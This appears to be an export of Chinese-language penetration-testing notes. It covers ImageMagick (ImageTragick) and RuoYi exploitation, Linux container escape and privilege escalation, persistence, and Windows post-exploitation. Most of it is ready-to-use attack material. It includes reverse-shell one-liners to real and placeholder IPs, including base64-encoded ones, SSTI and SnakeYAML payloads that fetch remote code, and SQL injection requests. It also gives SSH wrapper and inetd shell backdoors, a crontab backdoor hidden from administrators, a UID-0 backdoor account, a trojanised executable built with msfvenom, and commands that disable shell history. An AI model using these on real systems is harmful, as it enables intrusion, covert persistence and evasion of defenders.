Unauthenticated SQL Injection when viewing graphs · Advisory · Cacti/cacti https://github.com/Cacti/cacti/security/advisories/GHSA-6r43-q2fw-5wrg CVE-2020-8813-Cacti-v1.2.8-远程命令执行漏洞 - Cacti https://www.hacking8.com/bug-product/Cacti/CVE-2020-8813-Cacti-v1.2.8-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html 漏洞预警 | Cacti文件包含和SQL注入漏洞 | CN-SEC 中文网 https://cn-sec.com/archives/2342658.html 组件 Imagetragick 原理 ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行，漏洞发生的地方： 它在解析https图片的时候，使用了curl命令将其下载，这里定义了一些占位符，如%o是curl输出的文件名，%M是远程的URL路径。注意到command中的可以到%M是可以拼接其他指令并被在命令行中执行的。该漏洞也因此而来，被拼接完毕的命令行传入了系统的system函数，而我们只需使用反引号（`）或闭合双引号，来执行任意命令。也就是下面这样： command=\" \"curl\" -s -k -o \"%o\" \"https:%M\" \"/> 当%M为：https://\"|id && ls -al /etc/passwd\" command=\" \"curl\" -s -k -o \"%o\" \"https://\"|id && ls -al /etc/passwd\"\" \"/> payload 上传的图片内容 CVE-2016-3714--命令执行 # http请求 push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.0/oops.jpg\"|curl \"www.leavesongs.com:8889)' pop graphic-context # 反弹shell push graphic-context viewbox 0 0 640 480 fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`\"||id \" )' pop graphic-context CVE-2016-3715--任意删除文件 push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'ephemeral:/tmp/delete.txt' pop graphic-context CVE-2016-3716--任意文件写入 msl协议是读取一个msl格式的xml文件，并根据其内容执行一些操作 先上传一个图片马1.png和msl.xml # msl.xml内容，1.png重命名为shell.php 再上传exp图片 -=-=-=-=-=-=-=-=- push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'msl:msl.xml' pop graphic-context CVE-2016-3717--任意文件读取 push graphic-context viewbox 0 0 640 480 image over 0,0 0,0 'label:@/etc/hosts' pop graphic-context$ convert file_read.mvg out.png # produces file with text rendered from/etc/passwd ​ Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 17:11:58 "},"01.渗透测试/05.漏洞复现/若依漏洞复现.html":{"url":"01.渗透测试/05.漏洞复现/若依漏洞复现.html","title":"若依漏洞","keywords":"","body":"RuoYi介绍 http://ruoyi.vip/ 基于SpringBoot的权限管理系统 易读易懂、界面简洁美观。 核心技术采用Spring、MyBatis、Shiro没有任何其它重度依赖。 若依的作者将Spring Security替换为shiro RuoYi漏洞概览 官方对历史漏洞进行了相关整理：https://doc.ruoyi.vip/ruoyi/document/kslj.html#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E 漏洞名称 访问路径 版本 Thymeleaf SSTI /monitor/cache/getNames 定时计划反射RCE 系统监控—>定时任务—>添加任务->调用目标字符串 SQL注入 /system/role/list、/system/dept/edit 任意文件下载 /common/download/resource Fastjson RCE /tool/gen/edit 默认口令：admin/admin123 环境搭建 hunter web.body=\"/ruoyi/css/ry-ui.css?v=版本号\" 本地搭建 下载：https://gitee.com/y_project/RuoYi IDEA连接数据库 剩下步骤 修改配置文件RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xml中的数据库账号和密码 RuoYi搭建开发环境 - 掘金 Thymeleaf SSTI 本质上还是SPEL表达式注入Thymeleaf SSTI漏洞分析 - 先知社区 (aliyun.com) 复现 POST /monitor/cache/getNames HTTP/1.1 fragment=__${T%20(java.lang.Runtime).getRuntime().exec('curl%20cn0165.dnslog.cn')}__::.x 绕过姿势 记一次实战之若依SSTI注入绕过玄某盾 - 先知社区 后台定时任务--YAML反序列化 Java安全之SnakeYaml反序列化分析 - nice_0e3 - 博客园 (cnblogs.com) 复现 默认密码为admin/admin123 进入后台系统监控下的定时任务功能，可以发现调用目标字符串的字段。 生成yaml恶意jar包 https://github.com/artsploit/yaml-payload 修改项目源码文件 src/artsploit/AwesomeScriptEngineFactory.java 在idea中打开终端 # 打包为jar包 javac src/artsploit/AwesomeScriptEngineFactory.java jar -cvf yaml-payload.jar -C src/ . # 开启http服务 python -m http.server 1234 创建并开启定时任务 org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://ip:port/yaml-payload.jar\"]]]]') org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://ip:port/Evil') javax.naming.InitialContext.lookup('ldap://ip:port/#Evil') 结果 绕过姿势 某依rce黑名单多种bypass方法分析 - 先知社区 定时任务功能点绕过黑白名单执行任意sql语句 - 先知社区 后台Sql报错注入 复现 分析https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql POST /system/role/list HTTP/1.1 params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e)) POST /system/dept/edit HTTP/1.1 DeptName=1&DeptId=100&ParentId=12&Status=0&OrderNum=1&ancestors=0)or(extractvalue(1,concat((select user()))));# shiro反序列化 前面提到了若依的核心技术采用Shiro，如果密钥泄露了，自然就存在shiro反序列化漏洞。 默认是动态生成密钥，固定密钥可以在application.yml中配置shiro.cookie.cipherKey V4.3.1~V4.6.1，cipherKey使用硬编码zSyK5Kp6PZAAjlT+eeNMlg== 复现 后台任意文件下载 /common/download/resource?resource=/profile/../pom.xml RuoYi-v4.7.8-RCE-POC RuoYi-v4.7.8-RCE-POC CVE-2024-42913--sql注入 https://forum.butian.net/article/585 利用工具 相关路径 /system/duplicate/check /system/fillRule/add /system/fillRule/delete /system/fillRule/deleteBatch /system/fillRule/edit /system/fillRule/executeRuleByCode /system/fillRule/exportXls /system/fillRule/importExcel /system/fillRule/list /system/fillRule/testFillRule /system/gatewayRoute/clearRedis /system/gatewayRoute/delete /system/gatewayRoute/list /system/gatewayRoute/updateAll /system/getEncryptedString /system/log/list /system/login /system/loginfo /system/logout /system/message/systemMessage/add /system/message/systemMessage/delete /system/message/systemMessage/deleteBatch /system/message/systemMessage/edit /system/message/systemMessage/list /system/message/systemMessageTemplate/add /system/message/systemMessageTemplate/delete /system/message/systemMessageTemplate/deleteBatch /system/message/systemMessageTemplate/edit /system/message/systemMessageTemplate/list /system/message/systemMessageTemplate/sendMsg /system/online/forceLogout /system/online/list /system/oss/file/delete /system/oss/file/list /system/oss/file/upload /system/permission/add /system/permission/addPermissionRule /system/permission/delete /system/systemDepartRole/deptRoleUserAdd /system/systemDepartRole/edit /system/systemDepartRole/getDeptRoleByUserId /system/systemDepartRole/getDeptRoleList /system/systemDepartRole/list /system/systemUserAgent/add /system/systemUserAgent/edit /system/systemUserAgent/queryByUserName /system/tenant/add /system/tenant/delete /system/tenant/deleteBatch /system/tenant/edit /system/tenant/list /system/tenant/queryById /system/tenant/queryList /system/third/user/checkPassword /system/third/user/create /system/thirdApp/getEnabledType /system/thirdApp/recallMessageTest /system/thirdApp/sendMessageTest /system/thirdApp/sync/dingtalk/depart /system/thirdApp/sync/dingtalk/user /system/thirdApp/sync/wechatEnterprise/depart /system/thirdApp/sync/wechatEnterprise/user /system/thirdLogin/bindingThirdPhone /system/thirdLogin/getLoginUser /system/thirdLogin/oauth2 /system/thirdLogin/render /system/upload/uploadMinio /system/user/add /system/user/addSystemUserRole /system/user/changePassword /system/user/checkOnlyUser /system/user/delete /system/user/deleteBatch /system/user/deleteRecycleBin /system/user/deleteUserInDepart /system/user/deleteUserInDepartBatch /system/user/deleteUserRole /system/user/deleteUserRoleBatch /system/user/departUserList /system/user/edit /system/user/editSystemDepartWithUser /system/user/exportXls /system/user/frozenBatch /system/user/generateUserId /system/user/getCurrentUserDeparts /system/user/getMultiUser /system/user/list /system/user/passwordChange /system/user/phoneVerification /system/user/putRecycleBin /system/user/queryByIds /system/user/queryByOrgCodeForAddressList /system/user/queryUserByDepId /system/user/queryUserComponentData /system/user/queryUserRole /system/user/recycleBin /system/user/register Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-25 23:18:14 "},"02.后渗透/Linux/Linux渗透.html":{"url":"02.后渗透/Linux/Linux渗透.html","title":"Linux渗透总结","keywords":"","body":"判断是否为虚拟机 systemd-detect-virt 返回None则说明是物理机 whereis vmtoolsd 容器逃逸 如何判断是否在docker容器内 ls -al /.dockerenv cat /proc/1/cgroup docker容器逃逸检测脚本teamssix/container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com) 常见逃逸方法 Docker 介绍 | T Wiki Docker Remote API 未授权逃逸 docker remote api可以执行docker命令，docker守护进程监听在0.0.0.0，可直接调用API来操作docker。 Privileged 特权模式容器逃逸 sudo docker run -itd --privileged ubuntu:latest /bin/bash # 使用特权模式启动容器 fdisk -l # 查看磁盘文件 mkdir /tmp/test # 创建挂载目录 mount /dev/sda1 /tmp/test # 将宿主机磁盘挂载到挂载目录 chroot /tmp/test # 切换根目录 敏感目录挂载逃逸 df # 显示文件系统的磁盘空间使用情况，包括文件系统的挂载点 以挂载了宿主机/root到容器/root为例 宿主机内核漏洞导致逃逸 CVE-2016-5195实验：DirtyCoW与Docker逃逸 (wohin.me) Pyaload：scumjr/dirtycow-vdso: PoC for Dirty COW (CVE-2016-5195) (github.com) make ./0xdeadbeef 172.18.0.2:10000 由于最后获得的事实上是一个反弹shell，所以要给出反弹的IP和端口。端口可以随意设置，IP可以用ifconfig查看。 集成工具 CDK Home CN · cdk-team/CDK Wiki (github.com) CDK包括三个功能模块 Evaluate: 容器内部信息收集，以发现潜在的弱点便于后续利用。 Exploit: 提供容器逃逸、持久化、横向移动等利用方式。 Tool: 修复渗透过程中常用的linux命令以及与Docker/K8s API交互的命令。 补充 teamssix/awesome-cloud-security: awesome cloud security 收集一些国内外不错的云安全资源，该项目主要面向国内的安全人员 (github.com)https://github.com/source-xu/docker-vuls) 一个未公开的容器逃逸方式 - FreeBuf网络安全行业门户 Linux提权 https://mp.weixin.qq.com/s/tl1Qf1RukOBOcjp4PMXn_w Getshell/LinuxTQ: 《Linux提权方法论》 https://github.com/Getshell/LinuxTQ 辅助工具 GTFOBins GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制。该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利。需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限。 beroot BeRoot用于检查Linux和Mac OS上常见的错误配置，以找到一种方法来升级我们的特权。检查项包括GTFOBins中的二进制文件、通配符错误、suid、环境变量、NFS、sudo等等 python2 beroot.py Linepeas--不只是提权 LinPEAS 是一个脚本，用于搜索在 Linux/Unix*/MacOS 主机上提升权限的可能路径。https://github.com/peass-ng wget https://github.com/peass-ng/PEASS-ng/releases/download/20241101-6f46e855/linpeas.sh 可尝试利用的结果颜色，红字黄底（99% sure）和红字 参数选项 -o (仅执行选定的检查)： 仅执行指定的检查项目。可以选择多个项目，用逗号分隔。 例如：-o system_information,procs_crons_timers_srvcs_sockets,interesting_files 可选的检查项目包括： system_information：系统信息 container：容器 cloud：云环境 procs_crons_timers_srvcs_sockets：进程、计划任务、定时器、服务、套接字 network_information：网络信息 users_information：用户信息 software_information：软件信息 interesting_files：有趣的文件 api_keys_regex：API 密钥正则表达式 -r (启用正则表达式检查)： 启用正则表达式检查，这可能会花费几分钟到几小时的时间。 -P (指定密码)： 指定一个密码，用于运行 sudo -l 和通过 su 暴力破解其他用户账户。 -N (不使用颜色)： 不使用颜色高亮显示结果。 网络侦察 -t (自动网络扫描和互联网连接检查)： 自动进行网络扫描和互联网连接检查，并将结果写入文件。 -d (发现主机)： 使用 fping 或 ping 发现指定网段内的主机。 例如：-d 192.168.0.1/24 -p (发现开放端口)： 结合 -d 选项，发现指定网段内主机的开放端口。 默认扫描端口 22, 80, 443, 445, 3389，也可以指定其他端口。 例如：-d 192.168.0.1/24 -p 53,139 -i (扫描单个IP)： 使用 nc 扫描指定的单个IP地址。 默认扫描 nmap 的前1000个端口，也可以指定其他端口。 例如：-i 127.0.0.1 -p 53,80,443,8000,8080 端口转发 -F (端口转发)： 将本地IP和端口转发到远程IP和端口。 例如：-F 127.0.0.1:8080:192.168.1.1:80 pspy--进程监控 Pspy是一个命令行工具，用于在不需要root权限的情况下窥探进程。该工具通关循环遍历/proc下的值来获取进程参数信息。比如说我们可以找到一些定时任务进程或其他可疑进程来尝试提权 ./pspy64 traior--自动化提权🐂 多个linux提权漏洞缝合怪，运行后会给出提权方法，并内置了exp可以直接使用 常见提权手法 内核提权 强调利用内核漏洞的几个注意点： 读源码注释，有exp基本信息和编译方法，不然可能连编译都不会 读源码，不然费劲编译完才发现不适用 读源码，不然遇到一个删全盘的”exp“怎么办 遇到没有gcc的坑爹服务器。这时我们就需要在本地编译。本地编译时不止要看exp源码注释的编译参数，也需要手动调整一下编译的参数，比如给gcc 加-m 32来编译32位。编译问题繁多，有困难找谷歌。 脏牛漏洞（CVE-2016-5195） 漏洞原理：该漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。 PoCs · dirtycow/dirtycow.github.io Wiki Dirty Pipe(CVE-2022-0847) https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit 覆盖 /etc/passwd 中的 root 密码字段并在弹出 root shell 后恢复 https://haxx.in/files/dirtypipez.c 直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来 wget https://haxx.in/files/dirtypipez.c gcc -o dirtypipez dirtypipez.c ./dirtypipez /usr/bin/su #任何具体suid权限的文件均可 Docker提权 从脏管道（CVE-2022-0847）到 Docker 逃逸 CVE-2022-23222--不稳定 影响版本：5.8.0 https://github.com/tr3ee/CVE-2022-23222.git Docker 用户组提权 Docker 用户组提权 | T Wiki suid提权 谈一谈Linux与suid提权 | 离别歌 (leavesongs.com) suid全称是Set owner User ID up on execution。这是Linux给可执行文件的一个属性。 设置了s位的程序在运行时，其Effective UID将会设置为这个程序的所有者。比如，/bin/ping这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其Effective UID就是0，等同于拥有了root权限。 查找具有s位权限的命令 find / -user root -perm -4000 -print 2>/dev/null find / -perm -u=s -type f 2>/dev/null find / -user root -perm -4000 -exec ls -ldb {} ; 常见suid提权命令 find . -exec command \\; ./vim -c ':python3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")' sudo提权 sudo：super user do 不恰当的sudo命令配置 原理： 在交互模式以及无密码情况下（知道密码直接切换为root用户就好了）可以使用sudo -l查找哪些命令可以以root权限执行，使用这些命令创建一个新shell即可提权 在vi的ESC模式下输入!/bin/bash后按下回车即可变为root权限。 Linux sudo权限提升漏洞（CVE-2021-3156）-- 成功率高 查看sudo版本 sudo --version 版本影响 sudo 1.8.2 - 1.8.31p2 sudo 1.9.0 - 1.9.5p1 简单判断方法 sudoedit -s / 如果显示sudoedit: /: not a regular file，则表示该漏洞存在 EXP使用 https://github.com/worawit/CVE-2021-3156 对于 glibc 支持并启用了 tcache 的 Linux 发行版（CentOS 8、Ubuntu >= 17.10、Debian 10） exploit_nss.py→exploit_timestamp_race.c 对于 glibc 不支持 tcache 的 Linux 发行版（Debian 9, Ubuntu 16.04, or Ubuntu 14.04） exploit_nss_xxx.py→exploit_defaults_mailer.py→exploit_userspec.py blasty/CVE-2021-3156 (github.com) make ./sudo-hax-me-a-sandwich num # 选择合适的序号 环境变量提权 本质上还是suid提权，只不过具有suid权限的命令是用户自定义的，调用了其他命令，我们可以通过劫持调用的其他命令来提权。 比如有一个root用户自定义的具有suid权限的test命令，调用了系统命令ls，那我们可以找到一个可写目录，通过修改$PATH环境变量，劫持ls命令。 参考环境变量注入 | Khaz's Blog (fgtbnc.github.io) 权限配置不当提权 原理：某个脚本或命令以ROOT权限运行，但是低权限用户拥有修改写入权限 通过pspy找到可疑进程 定时任务 ..... 工具：https://github.com/mi1k7ea/M7-05 CVE-2021-4034 pkexec suid提权 其他 teehee teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权 核心思路就是利用其在passwd文件中追加一条uid为0的用户条目 echo \"raaj::0:0:::/bin/bash\" | sudo teehee -a /etc/passwd 按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录（空密码不能远程登录）。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限 Linux信息收集 相关命令 ifconfig /sbin/iconfig ip addr show 整合工具 ./gather -a 默认在/tmp/report下生成结果 keyword.txt # 这个有点少，要自己加 result.txt tree.txt # 目录结构 自己添加命令整理成sh脚本 Linux横向移动 密码破解 判断/etc/shadow或/etc/passwd中存储的密码使用的加密算法 MD5: 以 \"$1$\" 开头。 SHA-256: 以 \"$5$\" 开头。 SHA-512: 以 \"$6$\" 开头。 Blowfish: 以 \"$2a$\"、\"$2b$\" 或者 \"$2y$\" 开头。 DES: 以 \"$\" 开头，跟着一个数字。 Extended DES: 以 \"$9$\" 开头。 Sun MD5: 以 \"$md5$\" 开头。 SHA-1: 以 \"$sha1$\" 开头。 NTLM: 以 \"$NT$\" 或 \"$NTLM$\" 开头。 暴力破解 hashcat.exe -m 1600 -a 0 \"E:\\5.0\\pass.txt\" \"E:\\5.0\\rockyou.txt\" # -a 0 字典攻击 # -m 指定密文类型 # pass.txt中只能放密码密文，/etc/passwd拿到的要去掉user: hash id对照表：https://hashcat.net/wiki/doku.php?id=example_hashes 文章：https://xz.aliyun.com/t/4008?time__1311=n4%2BxnD0DyGYQqY5i%3DDCDlhjeK0KPahGRTRrD Linux权限维持 反弹shell 常用命令 攻击机监听端口 nc -lnvp port 被攻击机 bash -c 'bash -i >& /dev/tcp/ip/port 0>&1' bash -c \"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjE5Mi4xMjAvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}\" python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.174.129',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\" nc 124.220.192.120 1234 -e /bin/bash 注意点：用nc进行反弹shell，需要nc是提供-e参数的版本，但是系统apt默认安装的都是不提供反向链接的版本。 解决方法： 上传编译好的nc 利用管道符 被攻击机 攻击机 利用1234端口将传入内容交给bash执行，再将内容从端口8888送出去 获得交互式shell python3 -c 'import pty;pty.spawn(\"/bin/bash\")' python -c 'import pty;pty.spawn(\"/bin/bash\")' 键入 Ctrl-Z，回到 VPS 的命令行中；第二步，在 VPS 中执行： stty raw -echo fg 回到哑 shell 中；第三步，在哑 shell 中键入 Ctrl-l，执行： reset export SHELL=bash export TERM=xterm-256color stty rows 54 columns 104 SSH后门 SSH wrapper 被攻击机 首先启动的是/usr/sbin/sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动/usr/bin/sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的/usr/sbin/sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell 简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。 cd /usr/sbin/ mv sshd ../bin # 会导致ssh不能用 echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd service sshd restart \\x00\\x004A是13377的大端形式 攻击机 socat STDIO TCP4:IP:22,sourceport=port 修改通信端口 # python2 import struct port = 19526 buffer = struct.pack('>I6',port) print repr(buffer) >>'\\x00\\x00LF' echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd 变为 echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..LF/);' >>sshd SSH 软连接后门 PAM认证机制，若sshd服务中开启了PAM认证机制（默认开启cat /etc/ssh/sshd_config|grep UsePAM），当程序执行时，PAM模块则会搜寻PAM相关设定文件，设定文件一般是在/etc/pam.d/。若关闭则会验证密码，无法建立软链接后门。 pam_rootok.so主要作用是使得uid为0的用户，即root用户可以直接通过认证而不需要输入密码。 find /etc/pam.d |xargs grep \"pam_rootok\" 这些都可以作为ssh软链接后门：当我们通过特定的端口连接ssh后，应用在启动过程中就会去找到配置文件，如：我们的软链接文件为/tmp/su，那么应用就会找/etc/pam.d/su作为配置文件，因为/etc/pam.d/su使用了pam_rootok.so所以无需验证密码即可连接。 失败了。。 是因为SSH wrapper echo '#!/usr/bin/perl' >sshd 需要重新安装ssh ln -sf /usr/sbin/su /tmp/su /tmp/su -oPort=8888 实际上是随便输一个密码就可以登陆，但是不能不输密码。 SSH 公钥免密登陆 之前打靶机的时候的笔记 ssh验证方式 这里第二种：假设主机A要用SSH登录到主机B，那么只要主机A有私钥，主机B有对应的公钥即可，与是主机A生产的，还是主机B生成的无关。 # host为主机名（root） ssh host@ip -p port（password验证） ssh host@ip -i id_rsa -p port(密钥验证，私钥权限要为600才可以使用) 配置文件/etc/ssh/sshd_config PasswordAuthentication yes #启用密码验证 PubkeyAuthentication yes #启用密钥对验证 AuthorizedKeysFile .ssh/authorized_keys #指定公钥库文件 流程 ssh-keygen -t rsa # 生成密钥对 cat id_rsa.pub > authorized_keys #将公钥内容放到目标.ssh/authorized_keys里 ssh-copy-id host@ip -p 22 #将公钥上传至远程服务器用户目录中 strace后门 通过命令替换（命令行启动文件加入alias）动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。 # 监控ssh echo \"alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'\" >> /root/.bashrc # 立即生效 source /root/.bashrc kali没有strace，但是云服务器默认是装了的 查看记录的ssh连接 cat /tmp/.ssh.log 自启动文件后门 写入自启动文件中 开机启动项 /etc/init.d/ /etc/profile.d/ /etc/rc.d/xxx # 在xxx中添加需要开机执行的脚本的绝对路径 bash shell启动项 /etc/profile $HOME/.bash_profile $HOME/.bashrc $HOME/.bash_login $HOME/.profile 定时任务后门 echo xxx > /tmp/1.elf chmod +x /tmp/1.elf (crontab -l;printf \"*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash --noprofile -i;\\rno crontab for `whoami`%100c\\n\") 将no crontab for whoami文件写到/var/spool/cron/crontabs/root中，而crontab -l就是列出了该文件的内容。所以当管理员使用crontab -l查看定时任务时，就会看到no crontab for root，从而起到了隐藏的效果。 添加超级用户 应急响应第一个就排查/etc/passwd useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test Suid后门 SUID权限仅对二进制程序有效 cp /bin/bash /tmp/.long #将bash命令cp到.long二进制程序中 chmod u+s /tmp/.long #赋予SUID文件的权限 /tmp/.long -p bash2 针对suid有一些防护，所以需要加上-p参数来获取一个root的shell。 inetd后门 inetd是一个监听外部网络请求(就是一个socket)的系统守护进程，默认情况下为13端口。当inetd接收到一个外部请求后，它会根据这个请求到自己的配置文件中去找到实际处理它的程序，然后再把接收到的这个socket交给那个程序去处理。 # 安装 apt-get install openbsd-inetd # 写入配置文件 echo 'daytime stream tcp nowait root /bin/bash bash -i' >> /etc/inetd.conf # 请求daytime服务对应的13端口 nc -vv 192.168.111.128 13 配置解释 daytime stream tcp nowait root /bin/bash bash -i # 当外部请求名为daytime的服务时就弹shell 更改的话只需要修改service_name和nc连接的端口，服务与端口的映射关系在/etc/services中 ICMP后门 https://github.com/andreafabrizi/prism DNS后门 https://github.com/DamonMohammadbagher/NativePayload_DNS https://github.com/iagox86/dnscat2 http://code.kryo.se/iodine 进程注入 https://github.com/gaffe23/linux-inject https://sourceforge.net/projects/cymothoa/files/ https://github.com/screetsec/Vegile 隐藏文件/目录技巧 创建以.开头的隐藏文件 用ls -a才能看到 建立文件名为...的文件 参数混淆 下面两种方法可以使用rm -- -rm删除 建立文件名为-rm的文件 建立文件名为--的文件 既不报错，也没有删除 chattr隐藏权限 chattr +i 是一个 Linux 命令，用于将文件或目录设置为不可修改（immutable）。当应用了 +i 属性后，文件或目录将无法被修改、删除、重命名或链接。这个属性主要用于保护关键系统文件或目录，防止它们被意外或恶意篡改。请注意，这个命令需要在具有管理员权限的用户下执行 chattr +i hack.sh #lsattr才可以看到该权限 # 删除 chattr -i hack.sh rm -rf hack.sh 工具 需要python3环境RuoJi6/HackerPermKeeper (github.com) 🔒权限维持模块 centos Ubuntu 推荐指数 需要权限 备注 py2 py3 OpenSSH后门万能密码&记录密码 ❌ ✔️ ⭐ root 此后门需要很老的内核版本，而且需要很多依赖环境 ❌ ✔️ PAM后门 ❌ ❌ ⭐ ❌ 此后门需要很老的内核版本，而且需要很多依赖环境 ❌ ❌ ssh软链接 ✔️ ✔️ ⭐ ⭐ root 容易被发现 ✔️ ✔️ ssh公私密钥 ✔️ ✔️ ⭐ ⭐ ⭐ ⭐ ⭐ User 发现程度很难，参考了挖矿病毒 ✔️ ✔️ 后门帐号 ✔️ ✔️ ⭐ ⭐ ⭐ root 用命令添加账户，不会创建用户home目录[有一个是直接指向root目录] ✔️ ✔️ crontab计划任务 ✔️ ✔️ ⭐ ⭐ ⭐ ⭐ User or root 难以发现，通过执行计划任务 ✔️ ✔️ Strace后门 ✔️ ✔️ ⭐ ⭐ root 键盘记录的后门 ✔️ ✔️ Alias后门 ✔️ ✔️ ⭐ ⭐ ⭐ ⭐ root 别名后门，难以发现，但是需要用户去执行命令 ✔️ ✔️ Rootkit后门[检测] ❌ ❌ ⭐ ⭐ ⭐ root 难以发现，但是安装复杂，而且指定内核版本 ❌ ❌ 空格不记录命令 ✔️ ✔️ ⭐ ⭐ ⭐⭐⭐⭐ root 有的服务器设置了空格记录执行命令，执行这个脚本快速设置不记录空格命令 ✔️ ✔️ ssh软链接&crontab ✔️ ✔️ ⭐ ⭐ ⭐ ⭐ root 快速生成软链接，并且执行计划任务，每分钟判断当前软链接是否存在，如果被kill掉，就重新执行 ✔️ ✔️ check.py ✔️ ✔️ ⭐ ⭐ ⭐ ⭐⭐⭐ User 快速检测目标机器可以使用那个权限维持模块 ✔️ ✔️ sshkey密钥&crontab ✔️ ✔️ ⭐ ⭐ ⭐ ⭐⭐ ⭐ User or root 快速生成ssh密钥，并且执行计划任务，每分钟判断当前密钥和多个文件是否存在，如果被kill掉，就重新执行 ✔️ ✔️ php权限维持不死免杀马 ✔️ ✔️ ⭐ ⭐ ⭐ ⭐⭐ ⭐ User or root phpweb权限维持马 ✔️ ✔️ Linux痕迹清理 历史命令 # 禁用了Shell环境中的命令历史跟踪和存储 unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0 入侵痕迹清理 | Khaz's Blog (fgtbnc.github.io) Linux文件传输 https://www.cnblogs.com/yokan/p/16069234.html SCP scp -P port file root@104.243.25.78:/root/source_code 需要输入ssh密码，所以要先获得交互式shell 其他 find / -name \"*.conf\" find / -name \"*python*\" -type f -executable 2>/dev/null 上传的php无法执行 在php开头添加 #!/bin/php并执行chmod +x xx.php Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-11-30 20:26:06 "},"02.后渗透/Windows域渗透/Windows内网渗透.html":{"url":"02.后渗透/Windows域渗透/Windows内网渗透.html","title":"Windows内网渗透","keywords":"","body":"信息收集 本机信息收集 # 用户列表：windows用户列表 分析邮件用户，内网[域]邮件用户，通常就是内网[域]用户 net user /domain # 进程列表：分析杀毒软件/安全监控工具等 邮件客户端 VPN ftp等 tasklist /svc # 端口列表：开放端口对应的常见服务/应用程序[匿名/权限/漏洞等] 利用端口进行信息收集 netstat -ano # 补丁列表：分析 Windows 补丁 第三方软件[Java/Oracle/Flash 等]漏洞 systeminfo # 本机共享：本机共享列表/访问权限 本机访问的域共享/访问权限 smbclient -L ip net view \\\\ip # 敏感信息：查看安装程序和版本信息，浏览器，通讯软件，各类密码收集 wmic product get name,version findstr /sim 'password' *.txt *.xml *.docx *.php # 递归搜索当前目录下的文件 网络拓扑收集 # 网卡 ipconfig /all # 路由 route print # arp缓存 arp -a 域信息收集 权限维持 添加后门用户 RID劫持 后门文件 篡改exe 通过msf向exe中植入载荷 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b \"\\x00\" -f exe -o puttyX.exe 实验失败 篡改快捷方式 将快捷方式的属性值指向恶意文件 powershell.exe -WindowStyle hidden C:\\Users\\khaz\\Desktop\\calc.ps1 但是powershel窗口会一闪而过 劫持文件关联 创建Windows 任务计划程序 # 创建任务计划 schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr \"c:\\tools\\nc64 -e cmd.exe ATTACKER_IP 4449\" /ru SYSTEM /sc minute /mo 1：一分钟执行一次 /tn ：任务计划名称 /tr ：执行的命令 /ru ：以什么权限运行 # 查询任务计划 schtasks /query 隐藏任务计划 